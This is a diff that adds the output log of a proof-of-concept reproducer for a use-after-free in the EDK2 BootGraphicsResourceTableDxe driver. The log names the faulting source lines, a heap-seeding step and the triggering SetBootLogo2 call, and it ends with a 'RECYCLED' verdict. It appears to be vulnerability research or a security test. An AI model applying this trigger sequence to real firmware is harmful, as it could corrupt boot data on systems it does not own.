@@ -1,0 +1,61 @@
+
+=== BootLogo2 use-after-free reproducer ===============================
+target: MdeModulePkg/Universal/Acpi/BootGraphicsResourceTableDxe
+        GetBootLogo2 :398 hands out mLogoBltBuffer
+        SetBootLogo2 :320 frees it, :327 copies from the caller's pointer
+sizes : first logo 16x16 = 1024 bytes, second logo 8x8 = 256 bytes
+
+[1] protocol at 0x000000007EBB4A30
+[2] GetBootLogo2 before we set anything: Not Ready (buffer 0x0000000000000000, 0x0)
+BGRT (before): at 0x000000007FB73000  Status=0x0001 ImageType=0x0000 ImageAddress=0x000000007E076018 Offset=(415,355)
+BGRT (before): BMP 193x58, 24 bpp, image data at +0x36, 33694 bytes
+  bgrt-image +0000: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+  bgrt-image +0010: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+  bgrt-image +0020: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+BGRT (before): published image is not free poison; first 48 bytes match the PoC pattern for 0 bytes
+[3] SetBootLogo2(my buffer 0x000000007E905018, 16x16): Success
+[4] GetBootLogo2: Success -> 0x000000007E905698 (16x16 at 0,0)
+    the driver returned its own copy (my buffer was 0x000000007E905018)
+    the copy matches my pattern for 1024 of 1024 bytes
+  held +0000: 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30 
+  held +0010: 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40 
+[5] seeded the 256-byte bin with 4 freed blocks:
+      0x000000007E905D18
+      0x000000007E90CC18
+      0x000000007E90CD98
+      0x000000007E904018
+[6] SetBootLogo2(the driver's own pointer 0x000000007E905698, 8x8) -- this is the UAF
+    returned Success
+[7] GetBootLogo2: Success -> 0x000000007E905698 (8x8)
+[8] source block 0x000000007E905698, destination block 0x000000007E905698
+    destination is the same block as the source : yes
+    destination is one of the blocks step 5 freed : no
+    the source address is handed out again by AllocatePool(1024): no
+    the copied bytes match my pattern for 0 of 256 bytes
+    the copied bytes are all 0xAF (the pool free poison): yes
+  copied +0000: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+  copied +0010: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+  copied +0020: AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF AF 
+
+VERDICT: RECYCLED
+  The free-then-read sequence executed -- SetBootLogo2 cannot reach line 327
+  without passing line 320 -- but the allocator returned the very block it had
+  just released, so the copy read its own fresh allocation and nothing outside
+  the driver can show it. The observable that decided this: the pointer
+  GetBootLogo2 returns after the call is the same address it returned before.
+  The content is nevertheless all 0xAF, because DxeCore poisons a pool block
+  on both free and allocate, so the logo the firmware now holds is not the
+  logo that was set.
+
+The logo the firmware now holds is published to the ACPI BGRT at the next
+ReadyToBoot (BootGraphicsResourceTableDxe.c:484 and :503). Run this application
+once more, or boot an OS, and read the BGRT image.
+BGRT (after): at 0x000000007FB73000  Status=0x0001 ImageType=0x0000 ImageAddress=0x000000007E076018 Offset=(415,355)
+BGRT (after): BMP 193x58, 24 bpp, image data at +0x36, 33694 bytes
+  bgrt-image +0000: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+  bgrt-image +0010: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+  bgrt-image +0020: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 
+BGRT (after): published image is not free poison; first 48 bytes match the PoC pattern for 0 bytes
+
+=== end ==============================================================
+
